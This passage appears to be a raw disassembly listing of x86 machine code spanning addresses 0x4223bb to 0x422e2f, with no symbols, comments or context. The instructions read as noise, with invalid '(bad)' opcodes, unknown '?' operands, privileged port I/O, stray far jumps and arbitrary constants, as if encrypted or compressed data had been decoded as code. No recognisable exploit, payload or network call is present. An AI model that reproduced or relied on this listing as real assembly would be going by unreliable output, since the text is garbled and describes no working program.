  4223bb:	ret    0x2c9d
  4223be:	les    esi,FWORD PTR [esp+ebx*8]
  4223c1:	sub    BYTE PTR [eax+0x2f2bbc14],bl
  4223c7:	push   esp
  4223c8:	inc    edi
  4223c9:	or     al,0xfb
  4223cb:	out    dx,al
  4223cc:	mov    dl,0x84
  4223ce:	scas   eax,DWORD PTR es:[edi]
  4223cf:	test   DWORD PTR [eax+0x48],0xdb67a52f
  4223d6:	xor    al,0xa5
  4223d8:	shl    DWORD PTR [edx-0x176c6991],cl
  4223de:	pop    edi
  4223df:	shl    BYTE PTR [esi+0x12],0x6
  4223e3:	aam    0xc7
  4223e5:	test   BYTE PTR [ecx-0x9],0xa8
  4223e9:	scas   eax,DWORD PTR es:[edi]
  4223ea:	mov    ds:0xbe8fc697,al
  4223ef:	repnz and BYTE PTR [ecx],cl
  4223f2:	aaa    
  4223f3:	jb     0x4223f7
  4223f5:	dec    edi
  4223f6:	jnp    0x4223b7
  4223f8:	xchg   ecx,eax
  4223f9:	je     0x4223d2
  4223fb:	xchg   BYTE PTR [eax+0x2e],ch
  4223fe:	(bad)  
  4223ff:	dec    ebp
  422400:	enter  0xd9bc,0x4b
  422404:	repnz test BYTE PTR [ebx+0x295c1107],bl
  42240b:	lock sbb BYTE PTR [ecx+0x24],al
  42240f:	cmp    ebx,0x0
	...
  422471:	add    BYTE PTR [eax],al
  422473:	add    BYTE PTR [edx-0x7e],dl
  422476:	cs imul edi,esi,0xbbbb57ed
  42247d:	xor    ebp,esp
  42247f:	cdq    
  422480:	jg     0x422488
  422482:	loopne 0x422469
  422484:	fldcw  WORD PTR [ebp+0x1]
  422487:	add    BYTE PTR ds:0xc4000001,al
  42248d:	stc    
  42248e:	aaa    
  42248f:	outs   dx,BYTE PTR ds:[esi]
  422490:	fwait
  422491:	adc    ebp,ecx
  422493:	fmul   QWORD PTR [esi+0x13]
  422496:	add    ch,BYTE PTR [esi+0x48]
  422499:	idiv   esp
  42249b:	xor    al,0x80
  42249d:	in     al,dx
  42249e:	les    ebp,FWORD PTR es:[edx+0x3b]
  4224a2:	jo     0x4224b1
  4224a4:	push   ebx
  4224a5:	daa    
  4224a6:	pop    ss
  4224a7:	add    ah,BYTE PTR [edx+0x88ef08c]
  4224ad:	jecxz  0x4224f8
  4224af:	fldcw  WORD PTR [edi+ebx*1-0x4a2f1b4b]
  4224b6:	push   0x1c59e35e
  4224bb:	test   DWORD PTR [edx-0x420b97c5],ecx
  4224c1:	mov    esi,0xd737b489
  4224c6:	mov    al,ds:0xa3d91dd4
  4224cb:	shr    BYTE PTR [ebx+0xa],1
  4224ce:	leave  
  4224cf:	cwde   
  4224d0:	bound  ebx,QWORD PTR [edi+ebp*2+0x6e19e6d3]
  4224d7:	xchg   ecx,eax
  4224d8:	xor    ah,bh
  4224da:	(bad)  
  4224db:	icebp  
  4224dc:	pop    esp
  4224dd:	jb     0x4224a0
  4224df:	(bad)  
  4224e1:	out    0x97,eax
  4224e3:	dec    ebx
  4224e4:	retf   0xf0ae
  4224e7:	lea    esi,[eax+0x189721d8]
  4224ed:	xchg   edx,eax
  4224ee:	mov    DWORD PTR ds:0xc7497d32,ebx
  4224f4:	in     eax,dx
  4224f5:	out    0xfa,eax
  4224f7:	or     al,0xe
  4224f9:	dec    ax
  4224fb:	add    eax,0xde3a7004
  422500:	and    al,0xce
  422502:	lea    ebx,[ecx+0xd7f6293]
  422508:	nop
  422509:	cmp    ebp,DWORD PTR [eax]
  42250b:	add    dl,BYTE PTR [ecx-0x8]
  42250e:	scas   eax,DWORD PTR es:[edi]
  42250f:	jp     0x4224d6
  422511:	ja     0x4224d8
  422513:	mov    ebp,0x9dfacbc4
  422518:	and    ecx,DWORD PTR [edx+0x4d]
  42251b:	xchg   esi,eax
  42251c:	sub    eax,0x5dd39df8
  422521:	and    dh,BYTE PTR [ebx+0x439798d3]
  422527:	add    eax,DWORD PTR [eax-0x2f5d1942]
  42252d:	pop    es
  42252e:	ror    BYTE PTR [eax+edx*8],1
  422531:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422532:	adc    eax,0xca58ddb8
  422537:	mov    ecx,0xb16dc503
  42253c:	mov    dh,BYTE PTR [esi+0x0]
  42253f:	push   edx
  422540:	ja     0x422599
  422542:	aad    0x42
  422544:	sbb    esi,DWORD PTR [edi+0x2c0aff2b]
  42254a:	and    eax,0xdecbfb1e
  42254f:	push   ecx
  422550:	jo     0x42257a
  422552:	xchg   edi,eax
  422553:	scas   al,BYTE PTR es:[edi]
  422554:	dec    esp
  422555:	cdq    
  422556:	and    BYTE PTR [edx+0x2d],bh
  422559:	pushf  
  42255a:	cmp    BYTE PTR [ecx-0x1b],dh
  42255d:	std    
  42255e:	cli    
  42255f:	lods   al,BYTE PTR ds:[esi]
  422560:	add    al,0x4
  422562:	mov    al,0xd2
  422564:	andps  xmm1,XMMWORD PTR [edi-0x56]
  422568:	xchg   ebp,eax
  422569:	je     0x42256a
  42256b:	(bad)  
  42256c:	cld    
  42256d:	adc    cl,BYTE PTR [ebp+0x17]
  422570:	stos   DWORD PTR es:[edi],eax
  422571:	jae    0x4225ea
  422573:	mov    bh,0xa3
  422575:	dec    edx
  422576:	scas   eax,DWORD PTR es:[edi]
  422577:	leave  
  422578:	fwait
  422579:	repz add dh,bh
  42257c:	std    
  42257d:	cmp    dl,BYTE PTR [edx+0x716a4902]
  422583:	call   0xe6d0eb39
  422588:	sub    DWORD PTR [eax-0x72],edx
  42258b:	bound  eax,QWORD PTR [esi+0x5408dc2]
	...
  4225f1:	add    BYTE PTR [eax],al
  4225f3:	add    BYTE PTR [edx-0x40887052],bl
  4225f9:	ja     0x4225f5
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx+0x2770a2f8]
  422602:	xchg   esp,eax
  422603:	neg    dh
  422605:	outs   dx,BYTE PTR ds:[esi]
  422606:	add    DWORD PTR [eax],eax
  422608:	add    eax,0xf000001
  42260d:	mov    al,ds:0x6eae3ada
  422612:	inc    edi
  422613:	pop    es
  422614:	pusha  
  422615:	xchg   edx,eax
  422616:	rcl    BYTE PTR [edi-0x25779d4],0x94
  42261d:	pop    edi
  42261e:	push   ecx
  42261f:	mov    BYTE PTR [eax-0x11],dh
  422622:	pop    edi
  422623:	std    
  422624:	ja     0x4225fe
  422626:	jb     0x422618
  422628:	loop   0x422693
  42262a:	fisttp DWORD PTR [esi]
  42262c:	jo     0x4225e2
  42262e:	bound  ecx,QWORD PTR [esi-0x76]
  422631:	dec    esi
  422632:	loope  0x4226a1
  422634:	test   eax,0xcadd8b56
  422639:	mov    edi,0x99ec4777
  42263e:	jl     0x42262e
  422640:	js     0x422631
  422642:	xor    DWORD PTR [esi+0x2e],esi
  422645:	jmp    DWORD PTR [esi-0x62d8120c]
  42264b:	iret   
  42264c:	daa    
  42264d:	xchg   edi,eax
  42264e:	fs lock mov eax,0x3bb52a7e
  422655:	inc    esi
  422656:	jmp    0x9a1e:0xddc8105c
  42265d:	xchg   esp,eax
  42265e:	ins    BYTE PTR es:[edi],dx
  42265f:	push   es
  422660:	out    0x18,eax
  422662:	jge    0x422640
  422664:	loop   0x422677
  422666:	(bad)  
  422667:	stos   DWORD PTR es:[edi],eax
  422668:	and    al,0x2a
  42266a:	cli    
  42266b:	rcl    BYTE PTR [esi-0x57e4a083],cl
  422671:	adc    BYTE PTR [ebx-0x5fb21e4d],bl
  422677:	sub    DWORD PTR [ebp+0x43],0x49c19252
  42267e:	test   eax,0x5776d19e
  422683:	test   DWORD PTR [edx-0x46],ecx
  422686:	rcr    dh,cl
  422688:	adc    al,0x4c
  42268a:	call   0xa8947daa
  42268f:	push   edi
  422690:	clc    
  422691:	xlat   BYTE PTR ds:[ebx]
  422692:	push   ds
  422693:	enter  0xf8b9,0xb1
  422697:	ss sbb eax,0x642e8595
  42269d:	mov    al,ds:0xec71b28f
  4226a2:	xlat   BYTE PTR ds:[ebx]
  4226a3:	inc    eax
  4226a4:	pop    es
  4226a5:	add    eax,0x81128ba6
  4226aa:	pusha  
  4226ab:	xor    al,BYTE PTR [esi]
  4226ad:	cmp    bh,bh
  4226af:	retf   
  4226b0:	cmp    DWORD PTR [ecx+0x59e006c7],edi
  4226b6:	push   edi
  4226b7:	push   0xdd601e2e
  4226bc:	out    dx,eax
  4226bd:	inc    ecx
  4226be:	rcl    ebp,cl
  4226c0:	xchg   edi,eax
  4226c1:	int    0x3
  4226c3:	cli    
  4226c4:	enter  0xbc24,0xc6
  4226c8:	push   esp
  4226c9:	aas    
  4226ca:	add    eax,0x8bb334a8
  4226cf:	test   DWORD PTR [esi+0x67],ebx
  4226d2:	(bad)  
  4226d3:	mov    eax,0xac9f0074
  4226d8:	ss ret 
  4226da:	inc    eax
  4226db:	jl     0x4226e3
  4226dd:	icebp  
  4226de:	gs push ebx
  4226e0:	cli    
  4226e1:	and    ch,BYTE PTR [edx]
  4226e3:	sbb    ebp,edi
  4226e5:	inc    eax
  4226e6:	repnz out 0x1,al
  4226e9:	jb     0x4226fb
  4226eb:	xor    DWORD PTR [eax+0x89d5d6b],edx
  4226f1:	mov    edx,0x89c84253
  4226f6:	push   ss
  4226f7:	jnp    0x422752
  4226f9:	mov    dl,0x49
  4226fb:	jge    0x4226ad
  4226fd:	popa   
  4226fe:	adc    BYTE PTR [edi+0x6b6b9337],0x25
  422705:	xlat   BYTE PTR ds:[ebx]
  422706:	jbe    0x422760
  422708:	xchg   ecx,eax
  422709:	add    DWORD PTR [esi-0x56de4dd9],ecx
  42270f:	mov    bh,0x6f
	...
  422771:	add    BYTE PTR [eax],al
  422773:	add    BYTE PTR [edi],ah
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x207f01c8
  422781:	push   edi
  422782:	fld    QWORD PTR [edi+0x16fe3]
  422788:	add    eax,0xb0000001
  42278d:	into   
  42278e:	push   edx
  42278f:	(bad)  
  422790:	out    dx,al
  422791:	pop    esi
  422792:	les    ebp,FWORD PTR [ebx+0x34]
  422795:	lock sub ah,BYTE PTR ds:0xbce7c333
  42279c:	adc    dh,BYTE PTR [edx+0x14]
  42279f:	shl    BYTE PTR [esi],1
  4227a1:	push   esp
  4227a2:	inc    esp
  4227a3:	iret   
  4227a4:	add    DWORD PTR [edi],ebx
  4227a6:	cdq    
  4227a7:	mov    esp,0xae95f2a
  4227ac:	repz inc eax
  4227ae:	adc    eax,0xd595f361
  4227b3:	mov    ebp,edi
  4227b5:	call   0xf6d09280
  4227ba:	in     eax,0xfc
  4227bc:	cdq    
  4227bd:	and    eax,0xa399d693
  4227c2:	outs   dx,DWORD PTR ds:[esi]
  4227c3:	std    
  4227c4:	lods   eax,DWORD PTR ds:[esi]
  4227c5:	xchg   edx,eax
  4227c6:	aas    
  4227c7:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4227c9:	push   ds
  4227ca:	test   BYTE PTR [esi+0x5],bh
  4227cd:	(bad)  
  4227ce:	je     0x4227a3
  4227d0:	test   al,0x8e
  4227d2:	outs   dx,DWORD PTR ds:[esi]
  4227d3:	xchg   DWORD PTR [edi],ebx
  4227d5:	mov    ebx,0xe0f12b50
  4227da:	dec    esi
  4227db:	xchg   esi,eax
  4227dc:	call   0x574a:0xb00196c7
  4227e3:	pushf  
  4227e4:	push   es
  4227e5:	sahf   
  4227e6:	cmp    eax,0x8cac06a6
  4227eb:	(bad)  
  4227ec:	mov    bl,0x46
  4227ee:	loopne 0x42282b
  4227f0:	or     ebx,DWORD PTR [ebx]
  4227f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227f3:	mov    bh,0x4b
  4227f5:	jns    0x422847
  4227f7:	and    BYTE PTR [eax],ah
  4227f9:	sbb    al,0x14
  4227fb:	(bad)  [ebx-0x4d]
  4227fe:	scas   eax,DWORD PTR es:[edi]
  4227ff:	aad    0xf4
  422801:	out    dx,eax
  422802:	into   
  422803:	ss icebp 
  422805:	or     eax,0xb0d09a4b
  42280a:	xchg   esp,eax
  42280b:	xchg   edx,eax
  42280c:	jne    0x42281b
  42280e:	retf   
  42280f:	test   eax,0x2a3aace0
  422814:	aaa    
  422815:	fisubr DWORD PTR [ebx-0x21]
  422818:	icebp  
  422819:	lods   al,BYTE PTR ds:[esi]
  42281a:	lock sub BYTE PTR [ecx-0x6b],dh
  42281e:	test   DWORD PTR [edx-0x2d],esi
  422821:	jne    0x4227be
  422823:	mov    ds:0x3f61b14b,eax
  422828:	call   0x8a1964a4
  42282d:	in     al,0x16
  42282f:	enter  0x8a33,0x4c
  422833:	jl     0x4227d5
  422835:	inc    esp
  422836:	ds loope 0x42288d
  422839:	inc    esi
  42283a:	xchg   edi,eax
  42283b:	mov    DWORD PTR [ebx-0x2d27821e],esp
  422841:	jecxz  0x4227dd
  422843:	adc    DWORD PTR [ebp+0x1699afc6],esp
  422849:	jge    0x422891
  42284b:	mov    edi,0x108f6ef0
  422850:	xor    al,ch
  422852:	dec    esi
  422853:	sub    edx,ebp
  422855:	or     eax,eax
  422857:	inc    DWORD PTR [eax-0x2f9dcc80]
  42285d:	xchg   ecx,eax
  42285e:	inc    esi
  42285f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422860:	fs cmp ebx,eax
  422863:	pop    edx
  422864:	dec    ebp
  422865:	dec    ecx
  422866:	fcom   DWORD PTR [eax+0x59]
  422869:	fst    DWORD PTR [eax+0x3bab511f]
  42286f:	or     ch,BYTE PTR [eax-0x5c487706]
  422875:	push   esi
  422876:	jl     0x4228b4
  422878:	neg    eax
  42287a:	xchg   edx,eax
  42287b:	lds    ebp,FWORD PTR [edi]
  42287d:	lahf   
  42287e:	pop    esi
  42287f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422880:	iret   
  422881:	outs   dx,BYTE PTR ds:[esi]
  422882:	or     al,0x41
  422884:	mov    eax,0x4c60a27f
  422889:	ins    DWORD PTR es:[edi],dx
  42288a:	sbb    al,BYTE PTR [esi+eiz*8]
  42288d:	out    dx,al
  42288e:	fld    TBYTE PTR [edx+0xeb]
	...
  4228f4:	int    0x39
  4228f6:	mov    eax,0xef97fc97
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x4228e2
  422901:	add    DWORD PTR [ebx+0x170e85d],0x10500
  42290b:	add    BYTE PTR [esi-0x77a12823],ah
  422911:	cs out 0x31,eax
  422914:	dec    ebx
  422915:	adc    al,0x5c
  422917:	outs   dx,BYTE PTR ds:[esi]
  422918:	add    al,bl
  42291a:	imul   edx,DWORD PTR [esi+0x1af076e0],0x7d
  422921:	mov    al,ds:0x183e9ed4
  422926:	adc    eax,0x7f065160
  42292b:	pop    ebp
  42292c:	lods   al,BYTE PTR ds:[esi]
  42292d:	cli    
  42292e:	inc    ebp
  42292f:	sub    DWORD PTR [ecx+eiz*8],eax
  422932:	add    cl,BYTE PTR [edi+ecx*4]
  422935:	sbb    cl,BYTE PTR [esi+0x4e]
  422938:	jnp    0x42295f
  42293a:	sahf   
  42293b:	pop    ss
  42293c:	fistp  QWORD PTR [esi+0x39]
  42293f:	inc    ebp
  422940:	popf   
  422941:	aaa    
  422942:	ds dec esp
  422944:	popf   
  422945:	call   0xf394:0xfc73f3a3
  42294c:	mov    ah,0x41
  42294e:	push   0x5211012b
  422953:	pop    es
  422954:	retf   
  422955:	cmp    DWORD PTR [edx+ecx*8-0x54],0x10f36076
  42295d:	pop    edi
  42295e:	fs addr16 dec esi
  422961:	fwait
  422962:	or     DWORD PTR [edi],ebx
  422964:	push   esi
  422965:	xor    BYTE PTR ds:0x5bfd3bb0,dl
  42296b:	mov    edx,0x36ae675c
  422970:	pop    esp
  422971:	jmp    0xb634:0x2f35cf68
  422978:	mov    ecx,0xb4fe6348
  42297d:	mov    eax,ds:0xa97121f6
  422982:	mov    bh,0xfa
  422984:	aas    
  422985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422986:	dec    ebp
  422987:	stos   DWORD PTR es:[edi],eax
  422988:	mov    ?,edi
  42298a:	aaa    
  42298b:	mov    dl,0xb1
  42298d:	pop    ebp
  42298e:	jmp    0x11364385
  422993:	inc    edi
  422994:	xchg   ebx,eax
  422995:	xchg   edi,eax
  422996:	cmp    esp,esp
  422998:	jge    0x422985
  42299a:	xor    al,0xf0
  42299c:	sbb    dl,bh
  42299e:	mov    edx,0x8f7574
  4229a3:	cmp    DWORD PTR [ecx],eax
  4229a5:	xor    edx,eax
  4229a7:	sahf   
  4229a8:	or     al,al
  4229aa:	frstor [ebx]
  4229ac:	add    BYTE PTR [eax-0x79],0x3b
  4229b0:	pop    edi
  4229b1:	xchg   esi,eax
  4229b2:	cli    
  4229b3:	xchg   ebx,eax
  4229b4:	sbb    al,0xaf
  4229b6:	mov    ds:0xd4dcdfbb,eax
  4229bb:	push   esp
  4229bc:	push   eax
  4229bd:	add    bh,bh
  4229bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229c0:	sub    BYTE PTR [ebx+0x9364af4],al
  4229c6:	inc    edx
  4229c7:	fist   WORD PTR [eax+0x75]
  4229ca:	test   DWORD PTR [ecx],edi
  4229cc:	adc    BYTE PTR fs:[esi-0xe],dl
  4229d0:	xchg   edi,eax
  4229d1:	add    DWORD PTR [eax+0x7d],ebx
  4229d4:	aam    0xed
  4229d6:	sub    al,0x58
  4229d8:	xchg   esp,eax
  4229d9:	shr    DWORD PTR [ecx+0x18b2790c],0x76
  4229e0:	mov    dh,0x91
  4229e2:	push   eax
  4229e3:	paddb  mm1,QWORD PTR [eax-0x5fb7df80]
  4229ea:	imul   ecx,eax,0x157dea91
  4229f0:	outs   dx,DWORD PTR ds:[esi]
  4229f1:	cmpxchg esp,edi
  4229f4:	shl    DWORD PTR [edi+0x34e5fb08],0xdd
  4229fb:	mov    eax,ds:0x72b0b78
  422a00:	mov    ecx,0xf5b1f778
  422a05:	cmp    ebx,edx
  422a07:	and    al,0xe2
  422a09:	(bad)  
  422a0a:	in     al,dx
  422a0b:	shr    BYTE PTR [esp+edx*4+0x9be899],1
	...
  422a72:	add    BYTE PTR [eax],al
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	push   edi
  422a81:	(bad)  
  422a82:	aam    0x3b
  422a84:	in     eax,dx
  422a85:	jno    0x422a88
  422a87:	add    BYTE PTR ds:0x6000001,al
  422a8d:	mov    al,ds:0xd41a91e1
  422a92:	(bad)  
  422a93:	pop    esi
  422a94:	cmp    eax,0xf67f02a6
  422a99:	pop    ds
  422a9a:	scas   eax,DWORD PTR es:[edi]
  422a9b:	mov    al,0xf5
  422a9d:	sbb    DWORD PTR [ebp+0x5927354b],0xa4a612b3
  422aa7:	mov    ch,BYTE PTR [edi+0x22864f3]
  422aad:	sub    al,0xa
  422aaf:	imul   edx,DWORD PTR [esi-0x2946b5ee],0xffffffae
  422ab6:	adc    al,0x4
  422ab8:	sti    
  422ab9:	dec    eax
  422aba:	fwait
  422abb:	inc    edi
  422abc:	mov    edx,0x64c70e9d
  422ac1:	shr    BYTE PTR [edi+0x5a],1
  422ac4:	(bad)  
  422ac5:	in     eax,0x1b
  422ac7:	das    
  422ac8:	ds push 0x60
  422acb:	lods   eax,DWORD PTR ds:[esi]
  422acc:	push   ecx
  422acd:	pop    esi
  422ace:	cmp    cl,BYTE PTR [ebp+ecx*4-0x16]
  422ad2:	cdq    
  422ad3:	out    dx,al
  422ad4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ad5:	push   ds
  422ad6:	cwde   
  422ad7:	xchg   edi,eax
  422ad8:	or     BYTE PTR [ebp+0x2d],ch
  422adb:	retf   0xae84
  422ade:	push   es
  422adf:	xchg   BYTE PTR [esp+ebx*8-0xe4f657f],bh
  422ae6:	mov    esi,0xdd2dacc1
  422aeb:	cmp    dl,cl
  422aed:	dec    eax
  422aee:	fs dec esp
  422af0:	in     al,dx
  422af1:	rcl    DWORD PTR [esi+edx*2],cl
  422af4:	test   BYTE PTR [edi+esi*4-0x56cfaa43],bl
  422afb:	leave  
  422afc:	lods   al,BYTE PTR ds:[esi]
  422afd:	out    0x62,eax
  422aff:	loopne 0x422b17
  422b01:	ss dec ecx
  422b03:	cmc    
  422b04:	mov    ss,WORD PTR [edi-0x494d911a]
  422b0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b0b:	cwde   
  422b0c:	mov    al,ds:0x809a2bed
  422b11:	aad    0x45
  422b13:	rcl    DWORD PTR [ecx-0x74f183e5],cl
  422b19:	mov    bh,0xc3
  422b1b:	in     al,dx
  422b1c:	xor    BYTE PTR [ecx-0x29356af9],dl
  422b22:	adc    esi,ebp
  422b24:	mov    ?,WORD PTR [esi-0x4c]
  422b27:	std    
  422b28:	cmp    eax,0x61fef2b6
  422b2d:	imul   edx,DWORD PTR [ebp-0x2a6c648e],0x19
  422b34:	mov    ss,WORD PTR [edi]
  422b36:	pop    edi
  422b37:	lods   eax,DWORD PTR ds:[esi]
  422b38:	jge    0x422b65
  422b3a:	imul   edx,DWORD PTR [edx],0x13641a02
  422b40:	mov    ds:0xf97898a1,eax
  422b45:	imul   edx,DWORD PTR [edi+0x4d],0x31
  422b49:	jmp    DWORD PTR [ebx+0x1f4ff8f0]
  422b4f:	adc    BYTE PTR ds:[esi+0x5a954262],ch
  422b56:	inc    esp
  422b57:	fld    QWORD PTR [edx+0x16]
  422b5a:	std    
  422b5b:	aam    0x49
  422b5d:	shl    edx,0x94
  422b60:	imul   eax,edx,0x68
  422b63:	arpl   WORD PTR [esi+0x553ea4d4],si
  422b69:	ss loopne 0x422b3a
  422b6c:	div    DWORD PTR [edx-0x6d]
  422b6f:	pop    edx
  422b70:	(bad)  
  422b71:	into   
  422b72:	cmp    eax,0xc7d112fb
  422b77:	rcr    dl,1
  422b79:	push   ebx
  422b7a:	nop
  422b7b:	pop    ss
  422b7c:	push   ecx
  422b7d:	jnp    0x422b73
  422b7f:	xor    al,0x7d
  422b81:	mov    dl,0x86
  422b83:	jmp    0xc4512447
  422b88:	push   eax
  422b89:	dec    esi
  422b8a:	adc    edx,0x44a8771e
  422b90:	pop    ss
	...
  422bf1:	add    BYTE PTR [eax],al
  422bf3:	add    BYTE PTR [edi+esi*1+0x4a],al
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x422eb264]
  422c02:	push   eax
  422c03:	mov    dl,dh
  422c05:	jb     0x422c08
  422c07:	add    BYTE PTR ds:0x30000001,al
  422c0d:	dec    ebx
  422c0e:	mov    ecx,0x77f43520
  422c13:	pop    ecx
  422c14:	stc    
  422c15:	dec    edi
  422c16:	mov    dh,0x1d
  422c18:	lods   al,BYTE PTR ds:[esi]
  422c19:	push   ecx
  422c1a:	pop    esi
  422c1b:	clc    
  422c1c:	add    ah,BYTE PTR [edx+0x3f]
  422c1f:	xor    al,0x35
  422c21:	jnp    0x422c8d
  422c23:	mov    ah,0x60
  422c25:	cmp    DWORD PTR [ebx+eax*4-0x6f69f4bf],eax
  422c2c:	shl    DWORD PTR [ebx+0xbfaad50],cl
  422c32:	jl     0x422c2b
  422c34:	jb     0x422c6c
  422c36:	mov    al,0xa3
  422c38:	dec    esp
  422c39:	(bad)  
  422c3a:	mov    ebx,0x5f6956b6
  422c3f:	fnstenv [edi-0xa]
  422c42:	ins    BYTE PTR es:[edi],dx
  422c43:	test   DWORD PTR [esi],edx
  422c45:	xor    al,0xe5
  422c47:	sub    DWORD PTR [edx-0x1e94a9b8],ecx
  422c4d:	(bad)  
  422c4e:	fcomp  st(4)
  422c50:	pop    edx
  422c51:	fimul  DWORD PTR [edi-0x1df88e4a]
  422c57:	xchg   esi,eax
  422c58:	bound  ebx,QWORD PTR [esp+edx*8+0x609a2b2b]
  422c5f:	jmp    0x9fe1:0x5df28183
  422c66:	rcr    BYTE PTR [edx-0x5fe385d6],cl
  422c6c:	pop    ss
  422c6d:	dec    edi
  422c6e:	xor    DWORD PTR [ebp-0x2980666d],ecx
  422c74:	xchg   bl,dl
  422c76:	call   0xd467:0x7d073ecd
  422c7d:	ins    DWORD PTR es:[edi],dx
  422c7e:	push   eax
  422c7f:	push   ebp
  422c80:	stos   DWORD PTR es:[edi],eax
  422c81:	les    ecx,FWORD PTR [edx-0x71]
  422c84:	or     DWORD PTR [ecx+0x6d],ebx
  422c87:	or     al,0x6d
  422c89:	ret    0xb08
  422c8c:	cmp    eax,0x90f2d38e
  422c91:	call   0x4c34e4af
  422c96:	aaa    
  422c97:	rol    DWORD PTR [esi+0x4a576ad1],1
  422c9d:	xor    esp,edx
  422c9f:	xor    dh,BYTE PTR [ecx+0x1dafc6b7]
  422ca5:	xor    ebp,DWORD PTR [ebx+0x61]
  422ca8:	stos   DWORD PTR es:[edi],eax
  422ca9:	sbb    al,0x34
  422cab:	jns    0x422cee
  422cad:	clc    
  422cae:	and    DWORD PTR [eax+0x42],esp
  422cb1:	fwait
  422cb2:	ds push 0x66
  422cb5:	dec    edi
  422cb6:	out    dx,eax
  422cb7:	(bad)  
  422cb8:	jmp    0x422c83
  422cba:	mov    ecx,0xc1304dc1
  422cbf:	cmp    BYTE PTR [edi],al
  422cc1:	cmp    esi,DWORD PTR [ebx+edx*8+0x3108e512]
  422cc8:	les    edi,FWORD PTR [eax+0x2]
  422ccb:	int3   
  422ccc:	rcr    DWORD PTR [esi+0x51f7e69],cl
  422cd2:	xchg   esp,eax
  422cd3:	sub    bh,BYTE PTR [eax]
  422cd5:	je     0x422c5a
  422cd7:	gs ds mov bh,0x2c
  422cdb:	fs mov ch,0x38
  422cde:	test   BYTE PTR [edi+0x62afe75c],0xd8
  422ce5:	fisub  DWORD PTR [ebp-0x41fd9610]
  422ceb:	shl    BYTE PTR [edx+0x7bac45dd],0x38
  422cf2:	not    DWORD PTR [ebp-0x12]
  422cf5:	cmp    DWORD PTR cs:[ecx-0x56],esp
  422cf9:	jb     0x422d6c
  422cfb:	xor    BYTE PTR ds:0x476c6c57,bh
  422d01:	(bad)  
  422d03:	das    
  422d04:	cmp    DWORD PTR [ebx-0x1c762827],eax
  422d0a:	and    esi,esi
  422d0c:	cmp    eax,0xfb2b4c1
	...
  422d71:	add    BYTE PTR [eax],al
  422d73:	add    BYTE PTR [edi+0x626d60bd],bh
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    esi,DWORD PTR [esp+ecx*1+0x73f70702]
  422d86:	add    DWORD PTR [eax],eax
  422d88:	add    eax,0x7c000001
  422d8d:	scas   al,BYTE PTR es:[edi]
  422d8e:	jo     0x422d77
  422d90:	inc    ecx
  422d91:	push   ds
  422d92:	xlat   BYTE PTR ds:[ebx]
  422d93:	mov    ah,0xc4
  422d95:	push   ecx
  422d96:	xor    esp,esp
  422d98:	push   ebx
  422d99:	mov    cl,0x4a
  422d9b:	add    cl,BYTE PTR [eax+eiz*8]
  422d9e:	dec    edi
  422d9f:	mov    al,ds:0x834e0fb7
  422da4:	push   cs
  422da5:	imul   ecx,esi,0x2a
  422da8:	scas   eax,DWORD PTR es:[edi]
  422da9:	push   esi
  422daa:	retf   
  422dab:	add    DWORD PTR [edx+0x65fa5384],0xffffff93
  422db2:	test   al,0x7
  422db4:	pop    edx
  422db5:	sbb    esp,ebx
  422db7:	outs   dx,DWORD PTR ds:[esi]
  422db8:	imul   esi,DWORD PTR [edx+0x16fd999d],0x66
  422dbf:	sbb    al,0xbb
  422dc1:	mov    ds:0x6baf7d22,eax
  422dc6:	fsubp  st(5),st
  422dc8:	or     al,BYTE PTR [esi]
  422dca:	dec    eax
  422dcb:	pop    esi
  422dcc:	cmp    dh,cl
  422dce:	ror    DWORD PTR [ebp-0x52c35a55],1
  422dd4:	daa    
  422dd5:	mov    cl,BYTE PTR [ecx+0x132f91db]
  422ddb:	fcomi  st,st(2)
  422ddd:	cmp    al,0x90
  422ddf:	add    al,ch
  422de1:	mov    eax,0x7caa30ea
  422de6:	cmp    bl,bl
  422de8:	sub    ch,dl
  422dea:	scas   al,BYTE PTR es:[edi]
  422deb:	inc    esi
  422dec:	test   eax,0xb5df299a
  422df1:	sub    eax,0xd2678eb9
  422df6:	cmp    DWORD PTR [ebp+0x63],esp
  422df9:	mov    DWORD PTR ds:0xc1bae83a,eax
  422dff:	cwde   
  422e00:	dec    eax
  422e01:	cdq    
  422e02:	or     edi,esp
  422e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e05:	push   ebp
  422e06:	and    DWORD PTR [edx-0x11],esi
  422e09:	pop    ebx
  422e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e0b:	cmp    eax,DWORD PTR [edi-0x2d]
  422e0e:	adc    edx,DWORD PTR [ebp+0x27]
  422e11:	jns    0x422dff
  422e13:	push   ss
  422e14:	add    DWORD PTR [ebx],edi
  422e16:	xor    BYTE PTR [ecx],ch
  422e18:	jle    0x422e8c
  422e1a:	sar    dl,cl
  422e1c:	scas   al,BYTE PTR es:[edi]
  422e1d:	xchg   ecx,eax
  422e1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e1f:	xor    BYTE PTR [eax+0x6b3a0f7f],ch
  422e25:	mov    al,0x27
  422e27:	icebp  
  422e28:	fisttp DWORD PTR [ecx+0x74]
  422e2b:	fadd   st(7),st
  422e2d:	push   ecx
  422e2e:	hlt    
  422e2f:	popa   
